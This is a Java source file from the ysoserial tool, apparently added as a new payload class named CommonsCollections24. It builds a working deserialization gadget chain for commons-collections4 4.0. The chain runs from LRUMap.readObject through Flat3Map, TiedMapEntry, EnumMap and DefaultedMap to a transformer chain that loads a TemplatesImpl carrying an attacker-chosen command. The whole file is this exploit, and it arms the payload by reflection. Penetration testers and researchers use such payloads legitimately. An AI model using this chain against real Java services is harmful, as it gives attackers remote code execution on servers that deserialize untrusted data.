package ysoserial.payloads;

import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import org.apache.commons.collections4.map.DefaultedMap;
import org.apache.commons.collections4.map.Flat3Map;
import org.apache.commons.collections4.map.LRUMap;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import javax.xml.transform.Templates;
import java.util.EnumMap;
import java.util.Map;

/*
    Cluster2_20220605-162453, second chain.
	Gadget chain:

        chain_LRUMap4-readObject-170f97dab8eb7299a9b59c773ed708856efca487.txt
            [
         <org.apache.commons.collections4.map.LRUMap: void readObject(java.io.ObjectInputStream)>
         <org.apache.commons.collections4.map.LRUMap: void doReadObject(java.io.ObjectInputStream)>
         <org.apache.commons.collections4.map.AbstractHashedMap: void doReadObject(java.io.ObjectInputStream)>
         <org.apache.commons.collections4.map.AbstractHashedMap: java.lang.Object put(java.lang.Object,java.lang.Object)>
         <org.apache.commons.collections4.map.AbstractHashedMap: boolean isEqualKey(java.lang.Object,java.lang.Object)>
         <org.apache.commons.collections4.map.Flat3Map: boolean equals(java.lang.Object)>
         <org.apache.commons.collections4.keyvalue.TiedMapEntry: boolean equals(java.lang.Object)>
         <java.util.EnumMap: boolean equals(java.lang.Object)>
         <org.apache.commons.collections4.map.DefaultedMap: java.lang.Object get(java.lang.Object)>
         <org.apache.commons.collections4.functors.InvokerTransformer: java.lang.Object transform(java.lang.Object)>
         <java.lang.reflect.Method: java.lang.Object invoke(java.lang.Object,java.lang.Object[])>
        ]

 */
@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"org.apache.commons:commons-collections4:4.0"})
@Authors({ "BadagliaccaDaniele" })
public class CommonsCollections24 extends PayloadRunner implements ObjectPayload<LRUMap> {
    enum TryEnum {
        zZ,
        yy
    }

    public LRUMap<Object, Object> getObject(final String command) throws Exception {

        Object templates = Gadgets.createTemplatesImpl(command);

        org.apache.commons.collections4.functors.ConstantTransformer constant = new org.apache.commons.collections4.functors.ConstantTransformer(String.class);

        // mock method name until armed
        Class[] paramTypes = new Class[] { String.class };
        Object[] args = new Object[] { "foo" };
        InstantiateTransformer instantiate = new InstantiateTransformer(
            paramTypes, args);

        // grab defensively copied arrays
        paramTypes = (Class[]) Reflections.getFieldValue(instantiate, "iParamTypes");
        args = (Object[]) Reflections.getFieldValue(instantiate, "iArgs");

        ChainedTransformer chain = new ChainedTransformer(new org.apache.commons.collections4.Transformer[] { constant, instantiate });

        LRUMap lruMap = new LRUMap();

        EnumMap enumMap = new EnumMap(TryEnum.class);
        enumMap.put(TryEnum.yy, "yy");
        TiedMapEntry tiedMapEntry1 = new TiedMapEntry(enumMap, enumMap);
        Flat3Map flat3Map1 = new Flat3Map();
        flat3Map1.put(tiedMapEntry1, 1);

        EnumMap wrapped = new EnumMap(TryEnum.class);
        wrapped.put(TryEnum.yy, "zZ");
        /*ConstantTransformer constantTransformer2 = new ConstantTransformer(wrapped);
        Flat3Map flat3Map2 = new Flat3Map();
        flat3Map2.put(constantTransformer2, 1);*/
        DefaultedMap<String,Integer> defaultedMap = (DefaultedMap) DefaultedMap.<Map, org.apache.commons.collections4.Transformer>defaultedMap(wrapped, (org.apache.commons.collections4.Transformer<Integer,String>)chain);
        TiedMapEntry tiedMapEntry2 = new TiedMapEntry(defaultedMap, defaultedMap);
        Flat3Map flat3Map2 = new Flat3Map();
        // comunque non passa per il constantTransformer.equals
        //flat3Map2.put(constantTransformer2, 1);
        flat3Map2.put(tiedMapEntry2, 1);
        DefaultedMap<String,Integer> defaultedMap2 = (DefaultedMap) DefaultedMap.<Map, org.apache.commons.collections4.Transformer>defaultedMap(flat3Map2, (org.apache.commons.collections4.Transformer<Integer,String>)chain);


        //lruMap.put(flat3Map1, "b");
        //lruMap.put(flat3Map2, "a");
        lruMap.put(defaultedMap2, "b");
        lruMap.put(flat3Map1, "a");

        // swap in values to arm
        Reflections.setFieldValue(constant, "iConstant", TrAXFilter.class);
        paramTypes[0] = Templates.class;
        args[0] = templates;

        Reflections.setFieldValue(defaultedMap, "value", chain);


        return lruMap;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CommonsCollections24.class, args);
    }

}
